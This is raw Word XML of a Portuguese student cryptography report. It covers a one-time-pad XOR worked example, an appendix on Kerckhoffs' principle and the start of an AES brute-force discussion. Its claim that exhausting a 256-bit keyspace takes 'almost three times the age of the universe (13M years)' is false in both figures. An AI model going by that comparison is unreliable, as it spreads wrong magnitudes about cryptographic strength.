              <w:t>chave (ASCII)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1358" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1539C69D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>binário da chave</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1261" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="648525E3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>XOR (binário)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1156" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="630B5FC9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>resultado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="5A18EDB8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="982" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="68F7670F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1347" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7639A4BB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>S (83)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1332" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1C71848F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01010011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1068" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49F727B5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>0 (48)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1358" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="29BB28B7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>00110000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1261" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0C15C5C8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01100011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1156" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A514034" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Fontepargpadro"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="2E41FDA4" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="982" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="09649C17" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1347" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="73C4D593" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>I (73)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1332" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61426395" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01001001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1068" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4AF33CA5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>0 (48)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1358" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="706A66E5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>00110000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1261" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3CFA610B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01111001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1156" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6C69B497" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Fontepargpadro"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="4F6806A2" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="982" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="34AC4EED" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1347" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="515CA57A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>M (77)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1332" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6A4508D1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01001101</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1068" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="75702F69" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>0 (48)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1358" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6BD7C827" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>00110000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1261" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5026677E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:t>01111101</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1156" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="15" w:type="dxa"/>
              <w:left w:w="15" w:type="dxa"/>
              <w:bottom w:w="15" w:type="dxa"/>
              <w:right w:w="15" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6C5D3931" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Fontepargpadro"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64D35C2D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1B8416B2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="3567772B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="5D53718E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Como vemos, o resultado do texto cifrado é cy} e nada nele entrega alguma pista do texto original, podendo ser qualquer coisa. Mesmo com o poder computacional bruto em que palavras inexistentes são excluídas, outras palavras como um “bom, com, não, pão e etc.” tem a mesma probabilidade de serem a palavra original, tornando assim o segredo perfeito possível.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6538329E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Apesar do OTP alcançar o nível de segurança máximo, a sua utilização é impraticável nas comunicações cotidianas, pois a chave deve ter o mesmo tamanho do texto cifrado, o que os torna muito longas. Outro problema está na transmissão da chave, que deve ser transmitida por um canal seguro, e não deve ser utilizada mais do que uma vez. Essas limitações impedem o seu uso cotidiano, mas a existência da OTP prova que o segredo perfeito é alcançável.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FAD607" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2CF1A356" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4D13D715" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D2F2D5A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="65EB9EAC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B33298B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CD730B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28C333A8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="63A17285" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="43B344E3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4F6699DF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2E29DEF3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="175AC913" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="10E0AB9B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="16241AA6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="021F14C5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1C18948A" w14:textId="77777777" w:rsidR="00236B3B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="178" w:name="_Toc213874736"/>
      <w:bookmarkStart w:id="179" w:name="_Toc213881973"/>
      <w:r>
        <w:t xml:space="preserve">Apêndice B – </w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t>Princípio</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> de Kerckhoffs - Rafael Baptista</w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t>,</w:t>
      </w:r>
      <w:bookmarkEnd w:id="179"/>
      <w:r w:rsidR="00236B3B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6C8176" w14:textId="2BD817DF" w:rsidR="004253CC" w:rsidRDefault="00236B3B">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="180" w:name="_Toc213881974"/>
      <w:r>
        <w:t>nº 2024134</w:t>
      </w:r>
      <w:bookmarkEnd w:id="178"/>
      <w:bookmarkEnd w:id="180"/>
    </w:p>
    <w:p w14:paraId="46AF790A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54C35810" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="181" w:name="_Toc213874737"/>
      <w:bookmarkStart w:id="182" w:name="_Toc213881975"/>
      <w:r>
        <w:t>Introdução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="181"/>
      <w:bookmarkEnd w:id="182"/>
    </w:p>
    <w:p w14:paraId="65163913" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O principio de Kerckhoffs é um dos principios fundamentais da criptografia.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209870E3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Este principio tem 6 pontos principais:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132F65EC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O sistema deve ser materialmente, se não matemáticamente, indecifrável.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C65BDB8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>É necessário que o sistema em si não seja secreto, mesmo que caia nas mãos do inimigo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062BEB0D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Deve ser possível comunicar e lembrar da chave sem a necessidade de notas escritas, e os interlocutores devem ser capazes de modificá-las a seu critério.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE515D5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Deve ser aplicável à correspondência telegráfica.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38836A7D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O sistema deve ser portátil, e não deve exigir a participação de múltiplas pessoas na sua operação ou manuseio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24991CA5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O sistema deve ser simples e não exigir conhecimentos profundos ou concentração das pessoas que os usam, nem um conjunto complexo de regras.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20ECBA9D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34BFD641" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A3AAB59" wp14:editId="37CC6533">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="1490766542" name="Retângulo 223747334"/>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2961E5B1" id="Retângulo 223747334"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r>
        <w:t>Apesar de alguns destes pontos serem irrelevantes atualmente, três destes pontos são super importantes e que devemo-los destacar para a criptografia de hoje. Estes são o primeiro, o segundo e o quinto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8B3E73" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="375336B6" wp14:editId="0E66AE26">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="10275665" name="Retângulo 469220950"/>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4D399A84" id="Retângulo 469220950"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p>
    <w:p w14:paraId="7EE79C83" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Vamos aprofundar cada um destes 3 pontos com a ajuda do AES.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166C4C85" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="183" w:name="_Toc213874738"/>
      <w:bookmarkStart w:id="184" w:name="_Toc213881976"/>
      <w:r>
        <w:t>1 - Matemáticamente indecifrável</w:t>
      </w:r>
      <w:bookmarkEnd w:id="183"/>
      <w:bookmarkEnd w:id="184"/>
    </w:p>
    <w:p w14:paraId="53C058C4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Se pegarmos em algumas das criptografias standard atuais, vemos que as mesmas passam por diversas formulas de encriptação, umas com várias chaves, outras com apenas uma, mas ainda assim, estes processos não são “partíveis”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151A37DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Isto é, impossível matemáticamente e computacionalmente impossiveis de reverter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DDD8E7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Para encriptar uma mensagem, é super simples, super rápido, apenas precisamos de uma chave.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED6D190" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Para desencriptar é completamente o inverso, precisamos de descobrir a chave. Uma chave com 256 bits tem 64 caracteres:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52324B44" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>9f2a4b7c1d8e5f0a123b6c8d4e9f01ab3c7d9e2f0a1b4c5d6e7f8091a2b3c4d5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7E5441" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>E para testarmos todas as chaves possíveis, se um computador testar 1M de chaves por segundo precisariamos de 37(63 zeros) anos, o que quase três vezes a idade do universo (13M de anos).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7338AC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
